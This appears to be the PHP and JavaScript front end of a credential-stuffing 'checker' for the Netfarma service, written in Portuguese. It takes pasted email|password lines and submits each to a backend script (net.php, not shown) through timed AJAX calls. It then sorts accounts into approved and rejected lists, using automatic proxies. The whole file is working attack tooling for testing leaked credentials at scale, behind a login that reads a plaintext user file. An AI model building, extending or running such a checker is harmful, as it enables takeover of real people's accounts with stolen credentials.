<?php 

error_reporting(0);

set_time_limit(0);

session_start();



if(!isset($_SESSION['usuario']) and !isset($_SESSION['senha'])){

echo '<script language= "JavaScript">location.href="/"</script><br>';

  die();

}



$array_usuarios = file("../../../../jeaotop.txt");

$total_usuarios_registrados = count($array_usuarios);



$continuar = false;

for($i=0;$i<count($array_usuarios);$i++){

  $explode = explode("|" , $array_usuarios[$i]);

  if($_SESSION['usuario'] == $explode[0]){



    $_SESSION['senha'] = $explode[1];

    $_SESSION['rank'] = $explode[2];

    $_SESSION['creditos'] = $explode[3];

    $_SESSION['foto'] = $explode[4];

    $continuar = true;

  }

}



if(!$continuar){

echo '<script language= "JavaScript">location.href="/"</script><br>';

die();

}



?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>Checker Netfarma</title>
 

    <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.7/darkly/bootstrap.min.css" rel="stylesheet" integrity="sha384-S7YMK1xjUjSpEnF4P8hPUcgjXYLZKK3fQW1j5ObLSl787II9p8RO9XUGehRmKsxd" crossorigin="anonymous">
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.7/lumen/bootstrap.min.css">

    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Material+Icons" />
<script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js" integrity="sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn" crossorigin="anonymous"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>


  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>


    <style type="text/css">
 .badge-success {
    background-color: #28b62c;
  border-color: #24a528;
  display: inline-block;
  min-width: 10px;
  padding: 3px 7px;
  font-size: 12px;
  font-weight: normal;
  color: #ffffff;
  line-height: 1;
  vertical-align: middle;
  white-space: nowrap;
  text-align: center;

  border-radius: 10px;
}

.badge-danger {
  background-color: #ff4136;
  border-color: #ff1103;
  display: inline-block;
  min-width: 10px;
  padding: 3px 7px;
  font-size: 12px;
  font-weight: normal;
  color: #ffffff;
  line-height: 1;
  vertical-align: middle;
  white-space: nowrap;
  text-align: center;

  border-radius: 10px;
}

.badge-warning {
    background-color: #ff851b;
  border-color: #ff7001;
  display: inline-block;
  min-width: 10px;
  padding: 3px 7px;
  font-size: 12px;
  font-weight: normal;
  color: #ffffff;
  line-height: 1;
  vertical-align: middle;
  white-space: nowrap;
  text-align: center;

  border-radius: 10px;
}
 .fundo {
  width:450px;
     display: inline-block;
     filter:alpha(opacity=50);
     opacity: 0.5;
     -moz-opacity:0.5;
     -webkit-opacity:1;
     margin-bottom: 21px;
  background-color: #546575;
  border: 1px solid transparent;
  border-radius: 0;
  -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);

}
 .test {
  width:450px;
     display: inline-block;
     filter:alpha(opacity=50);
     opacity: 0.5;
     -moz-opacity:0.5;
     -webkit-opacity:1;
     margin-bottom: 21px;
  background-color: #546575;
  border: 1px solid transparent;
  border-radius: 0;
  -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);

 }
 .test2 {
  width:450px;
     display: inline-block;
     filter:alpha(opacity=50);
     opacity: 0.5;
     -moz-opacity:1;
     -webkit-opacity:1;
     margin-bottom: 20px;
  background-color: #546575;
  border: 1px solid transparent;
  border-radius: 0;
  -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);

 }
 .espaco{
  Margin-top: 8px;
  margin-bottom: 4px;
 
 }
 .panel-primary {
  display: inline-block;
     filter:alpha(opacity=50);
     opacity: 0.5;
     -moz-opacity:0.5;
     -webkit-opacity:0.5;
 }
</style>

<script>

function start()
{
  var i;
  var tudo =$('#text').val();
  var linha = tudo.split("\n");
  var separador= "|"
  //alert(cc.length);
  for (i = 0; i < linha.length; i++) {
    //alert(cc[i]);
    var separado = linha[i];
    var id = i;
    check(separado, separador, id);
    //setTimeout(function() { alert(j) }, 100, i);check(cc2, separador, id);
  }
}
var aps = 0;
var rps = 0;
var testadas = 0;
function check(separado, separador, id){
  setTimeout(function() {
    $.ajax({
      type:   'GET',
      url:  'net.php',
      dataType: 'html',
      data: { 'linha':separado },
      success: function(msg)
      {
        ++testadas;
document.getElementById('testado').innerText = testadas;
                            if(msg.indexOf("DIE") >= 0){
                                var reprovadas2 = $("#resultado2").val();
                                ++rps;
                                document.getElementById('reprovada_conta').innerText = rps;
                                $("#resultado2").val(reprovadas2 + msg + "\n")
                            }else{
                                var reprovadas = $("#resultado").val();
                                ++aps;
                                document.getElementById('aprovada_conta').innerText = aps;
                                $("#resultado").val(reprovadas + msg + "\n")
                            }
        //





      }
    });
  }, id * 1000);
}
</script>
 <style>
  a:link 
{ 
 text-decoration:none; 
}
.afs {
  font-weight: bold;
              }
            .green {
                background-color: rgba(92, 180, 91, 1);
                color: rgba(255, 255, 255, 0.87);
                padding: 0.25em 0.5em;
                border-radius: 3px;

}
.green {
  background-color: #4caf50;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
.red {
  background-color: #f44336;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
.check {
  background-color: #fcc100;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
            .botao2 {
                margin-top: 10px;
                width: 75px;
                height: 35px;
                background-color: rgba(245, 203, 130, 1);
                border-radius: 4px;
                border: none;
                color: rgba(255, 255, 255, 0.87);
                cursor: pointer;
                -webkit-appearance: button;
                transition: all .2s ease-in-out;
                font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
            }
            .botao2:hover {
                background-color: rgba(255, 255, 255, 0.87);
                color: #2C3A48;
            }
            .botao2:focus {
                outline: none;
            }
            .botao {
                margin-top: 10px;
                width: 75px;
                height: 35px;
                background-color: rgba(85, 216, 234, 1);
                border-radius: 4px;
                border: none;
                color: rgba(255, 255, 255, 0.87);
                cursor: pointer;
                -webkit-appearance: button;
                transition: all .2s ease-in-out;
                font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
}

</style>
</head>
<body>
  <center>
   <font size="7">Checker  Netfarma</font> <br />
   <font size="3" class="afs">Proxy Automatico</font>
   <br /><br />
      <textarea class="panel panel-primary" cols="90" rows="10" id="text" name="text" placeholder=" Email|Senha "></textarea>
      <br /><div class="afs">
           <font size="2">
                      <span id="status" class="cyan">Aprovadas : <span id="aprovada_conta" class="green">0</span> - Reprovadas : <span id="reprovada_conta" class="red">0</span> -Testadas : <span id="testado" class="check">0</span>             <br /><br />
            <button type="submit" id="x" name="x" class="btn btn-success" onclick="start()">Testar</button>
            <button type="submit" id="x" name="x" class="btn btn-danger" onclick="stop()">Parar</button>
<font></font>
 <br /><br />

<div class="test">
  <div class="espaco">
<p align="left" class="text-success" ><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#10004; - 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Aprovadas</b></p>
 </div> 
 </div>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<div class="test2">
   <div class="espaco">
  <p align="left" class="text-danger" ><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#10008; - 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Reprovadas</b></p>
</div> 
</div>


 <textarea class="panel panel-primary" id="resultado" style="width: 527px; height: 195px;"></textarea>
 <textarea class="panel panel-primary" id="resultado2" style="width: 527px; height: 195px;"></textarea>
</center>
</body>
</html>
